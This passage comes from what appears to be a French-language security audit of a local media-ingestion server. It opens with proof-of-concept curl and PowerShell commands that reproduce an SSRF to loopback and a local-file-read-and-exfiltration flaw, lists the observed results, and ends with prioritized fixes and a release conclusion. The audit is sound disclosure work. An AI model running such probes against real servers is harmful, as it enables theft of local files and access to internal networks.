curl.exe -s -X POST http://127.0.0.1:18080/ingest -H "Authorization: Bearer A4PROBE-0123456789abcdef" -H "Content-Type: application/json" --data-binary "@.phase0/audit/A4/probe-ssrf-loopback.json"
# → 201 accepted ; Get-Content .phase0\audit\A4\sink.log → "GET /leak.png -> 200"

# 5. LFI + exfiltration (AUD-A4-002)
curl.exe -s -X POST http://127.0.0.1:18080/ingest -H "Authorization: Bearer A4PROBE-0123456789abcdef" -H "Content-Type: application/json" --data-binary "@.phase0/audit/A4/probe-file-local.json"
$url = (python .phase0\audit\A4\exfil_probe.py .phase0\audit\A4\probe.db a4-probe-secret "img0.jpg") -match '^url=' | % { $_.Substring(4) }
curl.exe -s -o .phase0\audit\A4\exfil-wallpaper.jpg -w "%{http_code} %{size_download}`n" $url
Get-FileHash .phase0\audit\A4\exfil-wallpaper.jpg -Algorithm SHA256   # = hash du fichier Windows source
```

Résultats observés : `sink.log` = `GET /leak.png -> 200` (×3), `GET /redirect -> 302` ; DB : 4 assets (`leak.png` READY 12 420 o, `redirect` READY 12 420 o, `img0.jpg` READY 1 602 752 o, `gopher://` FAILED) ; `GET /overlay/media/...&sig=...` → `200 bytes=1602752 type=image/jpeg`.

## 9. Recommandations priorisées

| Priorité | Action | Réf. | Effort |
|----------|--------|------|--------|
| P0 | Garde-fou SSRF central (schémas + résolution DNS + IP non globales + revalidation par saut) | 001, 003 | 1,5–2 j-h |
| P0 | Restreindre/supprimer `file:` (jail canonicalisé, refus UNC/périphériques, handle unique) | 002 | 0,5–1 j-h |
| P1 | Worker de purge (FAILED/PROCESSING/fichiers orphelins) + quotas/rate limit par client d'ingestion | 008, 009 | 1,5–2 j-h |
| P1 | Écritures atomiques + single-flight par hash + suppression des variantes après succès | 007 | 1 j-h |
| P1 | Kill tree + cancellation + deadline globale + plafonds de buffers | 006 | 1–2 j-h |
| P2 | Validation MIME réelle (whitelist, ré-encodage image, pas de SVG, content-type dérivé du probe) | 004, 010 | 0,5–1 j-h |
| P2 | Plafonds de taille des réponses HTTP/page/JSON | 005 | 0,5 j-h |
| P3 | Sandbox binaires média, versions épinglées, durcissement `resolve_media_file` | 011, 014 | 1 j-h |
| P3 | Tests de régression SSRF/`file:`/redirections/atomicité (dé-`ignore` réseau) | 016 | 0,5 j-h |
| P4 | Petits correctifs : cookie échappé, `-` chemin ffprobe, borne durée job | 012, 013, 017 | 0,3 j-h |

**Conclusion** : les deux findings Élevés sont exploitables sans configuration exotique, dès qu'un client d'ingestion est appairé (cas normal d'usage de l'extension). Ils doivent être corrigés avant toute exposition du serveur au-delà d'un réseau de confiance, et probablement avant la release 3.0.0. Le reste relève du durcissement et de la robustesse (DoA, quotas, cycle de vie des fichiers).
